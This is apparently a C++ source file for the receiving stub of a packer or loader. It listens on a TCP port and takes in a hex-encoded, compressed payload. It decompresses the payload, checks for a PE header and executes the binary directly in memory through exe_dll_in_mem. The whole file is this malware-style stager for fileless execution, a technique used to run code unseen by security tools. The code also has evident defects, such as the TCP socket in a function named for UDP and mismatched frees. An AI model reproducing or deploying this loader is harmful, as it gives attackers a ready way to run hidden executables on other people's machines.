#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Ws2tcpip.h>
#include <tchar.h>
#include <string>
#include <iostream>

#include "decryption.h"
#include "decompression.h"
#include "MemLoadLibrary.h"
#include "ExecuteDLLinMem.h"

using namespace std;

#pragma comment(lib, "Ws2_32.lib")

SOCKET Socket, Sub;
WSADATA Winsock;
sockaddr_in Addr;
sockaddr_in IncomingAddress;
int AddressLen = sizeof(IncomingAddress);

//main lifting of the code
int udp_server_clinet(int Port)
{
    //server - start Winsock
    WSAStartup(MAKEWORD(2, 2), &Winsock);
    // Check version
    if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)
    {
        WSACleanup();
        return 0;
    }

    Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    ZeroMemory(&Addr, sizeof(Addr));
    Addr.sin_family = AF_INET;
    Addr.sin_port = htons(Port);
    bind(Socket, (sockaddr*)&Addr, sizeof(Addr));

    if (listen(Socket, 1) == SOCKET_ERROR)
    {
        printf("listening error\n");
    }
    else
    {
        printf("listening ok... waiting to recieve data\n");
    }

    if (Sub = accept(Socket, (sockaddr*)&IncomingAddress, &AddressLen))
    {
        printf("Client connected!\n");
        printf("Receiving file... \n");

        //declare variables
        int ClientPort = ntohs(IncomingAddress.sin_port);
        //char* ClientIP = inet_ntoa(IncomingAddress.sin_addr);
        int Size;
        char* Filesize = new char[1024];
        int Offset = 0;
        int n = 0;

        if (recv(Sub, Filesize, 1024, 0)) // File size
        {
            Size = atoi((const char*)Filesize);
			Size = Size - 1; //offset
            printf("Recieved file size: %d\n", Size);
        }
        else {
            printf("Failed to determine filesize of recieved file.\n");
                return 0;
        }

        //now that we have size, can create buffers
        char* Buffer = new char[Size];
		char* Buffer2 = new char[(Size/2)];
		unsigned char* DecompressedBuffer = new unsigned char[(Size*2)];  // make it larger since it has to decompress?

        //recieve data into Buffer
        while ((n = ::recv(Sub, Buffer + Offset, Size - Offset, 0)) > 0)
		{
            Offset += n;
        }

        //printf("Hex recieved from packer:\n%s\n", Buffer);

        //change hexstring back into bytes
		bool odd = 0;
		string tmp;
		int x = 0;
		for (int i = 0; i < Size; i=i+1)
		{
			tmp = "";
			tmp = Buffer[i];
			odd = !odd;
			if (i + 1 < Size)
			{
				i++;
				tmp = tmp + Buffer[i];
				odd = !odd;
			}

			Buffer2[x] = strtoul(tmp.c_str(), NULL, 16);
			x++;
		}
		//printf("\nRecieved data from packer translated back to raw:\n");
		//cout << Buffer2;
		//printf("\n");

        closesocket(Socket);
        closesocket(Sub);
        WSACleanup();
        printf("socket closed\n");


        //decryption ------------------------------------------------------------------------------------------
        //ToDo decryption
        //decryption();

        //decompression ---------------------------------------------------------------------------------------
        long decompressed_size;
        decompressed_size = uziphelp(Buffer2, DecompressedBuffer, (Size/2)); //decompression function
		//printf("Decompressed file:\n");
		//cout << DecompressedBuffer;
		//printf("\n");

        //execute in memory ------------------------------------------------------------------------------------
        //ToDo only execute in memory on (1) flag and (2) if it really is a PE as detected here.
        if (DecompressedBuffer[0] == 77) {
            if (DecompressedBuffer[1] == 90) {
                printf("Detected PE executable!\n");
            }
        }

        //in-memory execution
        exe_dll_in_mem(DecompressedBuffer, decompressed_size); //ToDo

		//we should have done this earlier
		free(Buffer);
		free(Buffer2);
		free(Filesize);
        return 0;
    }
}